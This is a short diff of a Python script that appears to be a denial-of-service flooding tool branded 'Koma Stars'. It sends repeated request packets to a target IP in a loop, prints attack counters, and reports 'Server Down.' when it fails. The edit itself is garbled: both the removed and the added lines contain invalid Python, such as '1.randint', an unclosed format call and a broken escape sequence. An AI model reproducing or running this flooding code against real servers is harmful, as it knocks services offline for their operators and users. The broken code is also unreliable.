@@ -84,8 +84,8 @@ def start():
             s.send(str.encode(main_req))
             for i in range(pack):
                 s.send(str.encode(main_req))
-            u += 1.randint(0, int(pack))
-            print("\033[33m[\033[1m+\033[33m]\033[92mKoma Stars  " +str(u)+ "  \033[33mAttack \033[97m::." +ip+ "\033[0m.")
+            xx += random.randint(0, int(pack))
+            print("\033[33m[\033[1m+\033[33m]\033[92mKoma Stars {0}:{1} | Sent: {2}}033[0m".format(str(ip)
         except:
             s.close()
             print('[+] Server Down.')
